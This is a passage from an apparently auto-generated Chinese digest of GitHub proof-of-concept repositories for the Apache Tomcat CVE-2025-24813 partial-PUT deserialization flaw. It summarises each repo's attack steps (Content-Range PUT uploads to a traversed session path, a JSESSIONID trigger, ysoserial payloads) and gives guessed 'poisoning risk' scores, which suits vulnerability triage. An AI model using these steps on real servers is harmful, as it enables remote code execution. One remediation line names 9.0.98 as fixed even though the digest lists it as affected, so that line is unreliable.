**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

